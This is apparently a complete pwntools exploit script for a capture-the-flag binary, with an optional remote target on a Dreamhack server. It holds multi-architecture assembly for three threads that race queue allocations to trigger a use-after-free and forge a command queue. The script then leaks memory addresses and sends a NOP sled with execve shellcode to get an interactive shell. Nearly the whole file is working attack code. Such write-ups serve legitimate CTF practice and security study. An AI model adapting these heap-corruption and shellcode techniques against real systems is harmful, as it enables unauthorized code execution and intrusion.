from pwn import *

context.log_level = "debug"
context.arch = "amd64"

pname="./chal"
scr = """
#b *start_process+433
#b *hook_call
#b *hook_call+0x51
#b *process_thread+92
#b *unity_pause
#b *core_init_queue
#b *vault_alloc_queue
#b *core_create_buf
#b *vault_conn_queue
#b *core_init_queue
#b *vault_process_sq
#b *vault_process_sq+298
#b *core_process_cq
#b *core_process_cq+294
#b *core_process_cq+211
#b *link_ctrl
#b *link_conn_queue
#b *link_realize
#b *core_create_request
#b *link_process_sq
#b *core_create_buf
#b *vault_process_sq
#b *vault_process_sq+534
#b *link_process_sq+400
#commands 
#    #b *core_init_queue
#    #b *core_process_cq
#    b *core_process_cq+0x126
#end
b *core_process_cq+599
set follow-fork-mode child
c
"""

CORE=0
LINK=1
VAULT = 2

code0 = """

    ## core_init
    mov     x0, #0
    mov     x1, #1
    mov     x2, #2
    mov     x3, #3
    mov     x4, #4
    mov     w8, #64
    svc     #0


    ## After init, lock this thread and wait until vault unlocks us
    mov x0, #2
    mov x1, #0x50 
    svc #0

    ## core_ctrl -> core_init_queue
    mov     x0, #1
    mov     x1, #0x103
    ## qidx
    mov     x2, #0
    ## Queue state
    mov     x3, #0x11
    svc     #0

    ## core_ctrl -> core_user_cmd
    mov     x0, #1
    mov     x1, #0x101
    ## qidx
    mov     x2, #0
    ## subcommand -> core_create_buf
    ### Should get recieved via vault_process_sq
    mov     x3, #0x111
    ## Buffer size ig
    mov     x4, #0x80 
    svc     #0

    ## Unpause vault thread so they can recv command 0x20
    mov x0, #2
    mov x1, #0x60
    ## 2 for the vault thread ID
    mov x2, #2
    svc #0

    ## Vault will unpause us after they process 0x20, wait till then
    mov x0, #2
    mov x1, #0x50 
    svc #0
    
    ## Now we need to do core_ctl -> core_user_cmd -> core_process_cq
    mov     x0, #1
    mov     x1, #0x101
    ## qidx
    mov     x2, #0
    ## subcommand -> core_process_cq
    mov     x3, #0x110
    svc     #0
    

   
    ## Now we start doing some link stuff ig
    ## Init queue for link
    ## core_ctrl -> core_init_queue
    mov     x0, #1
    mov     x1, #0x103
    ## qidx, needs to be 1, so we need to do more work in the vault thread to allocate ANOTHER queue
    mov     x2, #1
    ## Queue state
    mov     x3, #0x10
    svc     #0

    ## Unpause link thread
    mov x0, #2
    mov x1, #0x60
    ## 1 for the link thread
    mov x2, #1
    svc #0
    

    ## HOLD and wait for link to unpause us
    mov x0, #2
    mov x1, #0x50 
    svc #0


    ## core_ctrl -> core_user_cmd -> core_create_request
    mov     x0, #1
    mov     x1, #0x101
    ## qidx
    mov     x2, #1
    ## subcommand -> core_create_request
    mov     x3, #0x112
    ## loopback transfer command
    mov x4, #0x31
    svc     #0

    ## Unpause link thread
    mov x0, #2
    mov x1, #0x60
    ## 1 for the link thread
    mov x2, #1
    svc #0

    ## Wait again
    mov x0, #2
    mov x1, #0x50 
    svc #0

    ##
    ## Wanna spam the vault with as many allocation requests as we can so we can eventually free one of em
    ## For this we need to create many buffers
    ##


    ## We need to unpause the vault thread so it can be joining us and dequeuing our stuff and EVENTUALLY freeing a ptr
    mov x0, #2
    mov x1, #0x60
    mov x2, #2
    svc #0

    ## Vault will try to unpause us initially, so we will stay paused
    mov x0, #2
    mov x1, #0x50 
    svc #0

    mov x6, #0
morebuffer:
    mov x5, #0
morebuffer_sub:
    ## core_ctrl -> core_user_cmd
    mov     x0, #1
    mov     x1, #0x101
    ## qidx
    mov     x2, #0
    ## subcommand -> core_create_buf
    ### Should get recieved via vault_process_sq
    mov     x3, #0x111
    ## Buffer size ig
    mov     x4, #0x200 
    svc     #0

    add x5, x5, #1
    ## 0x8 is the queue capacity
    cmp x5, #0x8
    bne morebuffer_sub

    ## We should pause ourselves at this point to let vault drain the queue
    ## also need to unpause vault aswell.
    mov x0, #2
    mov x1, #0x60
    mov x2, #2
    svc #0

    ## Wait to be unpaused
    mov x0, #2
    mov x1, #0x50 
    svc #0

    ## Once resumed we can continue sending...
    add x6, x6, #1
    cmp x6, #0x4
    bne morebuffer

    ##
    ## First ptr should have been UAFd now, potentially. Lets see if we can access
    ## ALSO: May need to clean the queue before that point, but idk.
    ##

    ## Now queue up a command to send to link to double check if we can actually uaf this
    ## core_ctrl -> core_user_cmd -> core_create_request
    mov     x0, #1
    mov     x1, #0x101
    ## qidx
    mov     x2, #1
    ## subcommand -> core_create_request
    mov     x3, #0x112
    ## loopback transfer command
    mov x4, #0x31
    svc     #0

    ## Unpause link
    mov x0, #2
    mov x1, #0x60
    ## 1 for the link thread
    mov x2, #1
    svc #0


    ## Wait again
    mov x0, #2
    mov x1, #0x50 
    svc #0

    ## core_ctrl -> core_init_queue
    mov     x0, #1
    mov     x1, #0x103
    ## qidx
    mov     x2, #2
    ## Queue state
    mov     x3, #0x11
    svc     #0

    ## Now we need to do core_ctl -> core_user_cmd -> core_process_cq
    mov     x0, #1
    mov     x1, #0x101
    ## qidx 2, should be the one we messed with
    mov     x2, #2
    ## subcommand -> core_process_cq
    mov     x3, #0x110
    svc     #0
    ## And again
    mov     x0, #1
    mov     x1, #0x101
    ## qidx 2, should be the one we messed with
    mov     x2, #2
    ## subcommand -> core_process_cq
    mov     x3, #0x110
    svc     #0



    ##
    ## Final stage?
    ##

    ## core_ctrl -> core_user_cmd -> core_create_request
    mov     x0, #1
    mov     x1, #0x101
    ## qidx
    mov     x2, #1
    ## subcommand -> core_create_request
    mov     x3, #0x112
    ## loopback transfer command
    mov x4, #0x31
    svc     #0

    ## Unpause link
    mov x0, #2
    mov x1, #0x60
    ## 1 for the link thread
    mov x2, #1
    svc #0

    ## Wait again
    mov x0, #2
    mov x1, #0x50 
    svc #0

    ## Now we need to do core_ctl -> core_user_cmd -> core_process_cq
    mov     x0, #1
    mov     x1, #0x101
    ## qidx 2, should be the one we messed with
    mov     x2, #2
    ## subcommand -> core_process_cq
    mov     x3, #0x110
    svc     #0
    ## And again
    mov     x0, #1
    mov     x1, #0x101
    ## qidx 2, should be the one we messed with
    mov     x2, #2
    ## subcommand -> core_process_cq
    mov     x3, #0x110
    svc     #0

    ## Wait again
    mov x0, #2
    mov x1, #0x50 
    svc #0


"""

code1 = """

    ## binascii.hexlify((asm(\"xchg rsi,rax; xor eax,eax; pop rdx;\") + b\"\xeb\x07\")[::-1])
    mov r8, 0x07eb5ac0319648 
    mov r10, 0x4242424242424242
    ## binascii.hexlify((asm(\"shr rdx, 32; xor edi,edi;syscall\"))[::-1])
    mov r11, 0x050fff3120eac148
    mov r10, 0x4444444444444444
    mov rsp, 0x1500
    push r8
    push r10
    push r11


    ## If weve been unpaused it means core prolly prepped the queue for us
    ## We gotta init and stuff 
    mov rax, 0
    int 0x80
    ## syscall

    ## Link thread starts locked cuz i say so bishhhh
    mov rax, 2 
    mov rbx, 0x50
    int 0x80
    ## syscall 


    ## Connect to queue
    mov rax, 1
    mov rbx, 0x300 
    int 0x80
    ## syscall

    ## Unpause core thread
    mov rax, 2 
    mov rbx, 0x60
    mov rcx, 0 
    int 0x80
    ## syscall 
   
    ## Wait again to be unpaused - core thread has to send a req
    mov rax, 2 
    mov rbx, 0x50
    int 0x80

    ## Now we get to link_process_sq
    mov rax, 1
    mov rbx, 0x301 
    int 0x80

    ## Unpause core
    mov rax, 2 
    mov rbx, 0x60
    mov rcx, 0 
    int 0x80
    ## syscall 

    ## Wait afterwards
    mov rax, 2 
    mov rbx, 0x50
    int 0x80


    ## Should have been called upon by core POST uaf now.
    ## MOAR link_process_sq
    mov rax, 1
    mov rbx, 0x301 
    int 0x80

    ## Unpause core thread
    mov rax, 2 
    mov rbx, 0x60
    mov rcx, 0 
    int 0x80

    ## Wait for other stuff innit
    mov rax, 2 
    mov rbx, 0x50
    int 0x80


    ##
    ## Final stage?
    ##

    ## When we are done waiting, we need to do another link_process_sq
    mov rax, 1
    mov rbx, 0x301 
    int 0x80

    ## Unpause core thread
    mov rax, 2 
    mov rbx, 0x60
    mov rcx, 0 
    int 0x80


    ## And wait again
    mov rax, 2 
    mov rbx, 0x50
    int 0x80

"""


code2 = """


    ## vault_realize
    mov r0, #0
    svc #0
    
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #0
    ## Make new queue at pqueue[idx]
    mov r3, #0x20
    mov r4, #0x8
    svc #0
    
    ## Now we need to fill in pqueue[idx][2]
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #0
    ## Make new queue at pqueue[idx]
    mov r3, #0x22
    mov r4, #0x8
    svc #0

    ## Now we need to fill in pqueue[idx][1]
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #0
    ## Make new queue at pqueue[idx]
    mov r3, #0x21
    mov r4, #0x8
    svc #0

    ## Need to do the same for queue[idx+1]
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #1
    ## Make new queue at pqueue[idx]
    mov r3, #0x20
    mov r4, #0x8
    svc #0
    
    ## Now we need to fill in pqueue[idx+1][2]
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #1
    ## Make new queue at pqueue[idx]
    mov r3, #0x22
    mov r4, #0x8
    svc #0

    ## Now we need to fill in pqueue[idx+1][1]
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #1
    ## Make new queue at pqueue[idx+1]
    mov r3, #0x21
    mov r4, #0x8
    svc #0


    ## Now that queue is set up we need to call core_init_queue
    ## But specifically we need to WAIT while this is happening.
    ## So its time for unity_pause

    ## First we gotta unpause the core thread 
    mov r0, #2
    mov r1, #0x60
    ## 0 for the core thread ID
    mov r2, #0
    svc #0

    ## Lock this thread and wait until unlocked
    mov r0, #2
    mov r1, #0x50
    svc #0


    ## Now that we r unlocked it *should* be time for us to receive command 0x20 
    ## However we need to connect the queue first.

    ## vault_ctrl -> vault_conn_queue
    mov r0, #1
    mov r1, #0x200
    svc #0

    ## vault_ctrl -> vault_process_sq
    mov r0, #1
    mov r1, #0x202
    ## qidx
    mov r2, #0
    svc #0

    ## Before we do anything i wanna make sure we have a queue ready for afterwards
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #2
    ## Make new queue at pqueue[idx]
    mov r3, #0x20
    mov r4, #0x8
    svc #0


    ## Unpause the core thread
    mov r0, #2
    mov r1, #0x60
    ## 0 for the core thread ID
    mov r2, #0
    svc #0

    ## Now that we sent the ptr and size over core can resume control after we are unpaused
    mov r0, #2
    mov r1, #0x50
    svc #0


    mov r5, #0

process_buffers:
    mov r4, #0

    ## Unpause core, if first iter this wont matter but still a good idea
    mov r0, #2
    mov r1, #0x60
    ## 0 for the core thread ID
    mov r2, #0
    svc #0

    ## Pause ourselves and wait for core to fill the queue with stuff
    mov r0, #2
    mov r1, #0x50
    svc #0

process_buffers_sub:

    ## vault_ctrl -> vault_process_sq
    mov r0, #1
    mov r1, #0x202
    ## qidx
    mov r2, #0
    svc #0

    add r4,r4,#1

    ## Queue capacity is 8
    cmp r4,#0x8
    bne process_buffers_sub

    add r5,r5,#1 
    cmp r5, #0x4
    bne process_buffers

    ##
    ## Now we r dun with dat
    ##
    
    ## Before we unpause core, need to allocate ANOTHER queue we can mess with.
    ## This should reclaim the UAFd chunk. Meaning we then have a reference to a queue which we can then write into via link.
    ## Sick bro
    ## Now we need to fill in pqueue[2][2]
    ## vault_ctrl -> vault_alloc_queue
    mov r0, #1
    mov r1, #0x201
    ## qidx
    mov r2, #2
    ## Make new queue at pqueue[idx]
    mov r3, #0x22
    mov r4, #0x8
    svc #0

    ## Unpause core so we can write into it if we wanna
    mov r0, #2
    mov r1, #0x60
    ## 0 for the core thread ID
    mov r2, #0
    svc #0

    ## Now we wait
    mov r0, #2
    mov r1, #0x50
    svc #0
"""

def make_thread(chc, data, code):
    global p
    p.sendline(str(chc))
    p.sendafter("DATA> ", data)
    p.sendafter("CODE> ", code + b"\xcc")


def main():
    global p
    global code0
    global code1
    global code2
    global pname
    print(pname)

    context.arch = "arm"
    code2 = asm(code2)
    context.arch = "aarch64"
    code0 = asm(code0)
    context.arch = "amd64"
    code1 = asm(code1)

    DEBUG=0
    ATTACH=0
    REMOTE=0
    if (DEBUG):
        p = gdb.debug([pname], scr)
    else: 
        if (REMOTE):
            p = remote("host8.dreamhack.games", 19189)
            ATTACH=0
        else:
            p = process(pname)
        if (ATTACH):
            gdb.attach(p, scr)

    addr = p64(0x1000)
    mem_sz = p64(0x2000)
    alloc_sz = p64(0x500)


    p.sendafter("...", "\n")

    ## #2
    make_thread(CORE, addr + mem_sz + alloc_sz, code0)
    ## #1, arena 1
    make_thread(VAULT, addr + mem_sz + alloc_sz, code2)
    ## #0 x86
    make_thread(LINK, addr + mem_sz + alloc_sz, code1)

    p.sendafter("loopback> ", "A"*0x20, timeout=100000)
    
    ## Now we send our fake queue
    #p.sendafter("loopback> ", p64(0x0000000100000108) + p64(0x0000008000000093) + p64(0x4141414141414141), timeout=100000)
    ## Set the length to 0x1f80
    cmdq = flat([
        p64(0x0000000100000208),
        p64(0x00001f8000000042),
        p64(0x4141414141414141),
        p64(0x0000ff8000000092),
        p64(0x4141414141414141),
        ])
    p.sendafter("loopback> ", cmdq, timeout=100000)
    #p.sendafter("loopback> ", p64(0x0000000100000108) + p64(0x0000ff8000000042) + p64(0x4141414141414141), timeout=100000)
    
    context.log_level="error"
    sleep(0.5)
    p.recvuntil("bytes", timeout=10000)
    #leakbuf=b''
    #while (len(leakbuf) != 0x500):
    #leakbuf = p.recv(timeout=10000)

    p.recvuntil("5\x00\x00\x00\x00\x00\x00\x00\x18\x0e", timeout=10000)
    leakbuf = p.recv(0x500, timeout=10000)
    print(f"[*] BUF: {leakbuf[0x88:]}")
    #rwx = u64(leakbuf[0x90+1:0x98+1]) - 0xe18
    rwx = u64(b"\x18\x0e" + leakbuf[:6]) - 0xe18
    x86map = rwx - 0x48000000
    print(f"[*] Maybe x86: {hex(x86map)}")
    x86cont = x86map + 0x10d
    print(f"[*] First controlled instruction: {hex(x86cont)}")
    print(f"[*] RWX region: {hex(rwx)}")
    our_queue = u64(leakbuf[0xd0+1:0xd8+1])
    print(f"[*] Our queue: {hex(our_queue)}")

    cmdq = flat([
        p64(0x0000000100000208),
        p64(0x00001f8000000040),
        p64(x86cont),
        p64(0x0000ff8000000093),
        ])


    #p.interactive()

    p.sendafter("loopback> ", cmdq, timeout=100000)

    sleep(0.5)

    shc = asm("""
        mov rax, 1
        mov rdi, 1
        sub rsi, 0x20
        mov rdx, 0x100 
        syscall


        mov rax, 0x3b
              """)
    p.send(b"\x90" * 0x100 + shc + asm(shellcraft.sh()))
    p.send(b"\x90" * 0x100 + shc + asm(shellcraft.sh()))

    p.interactive()



if __name__ == "__main__":
    main()
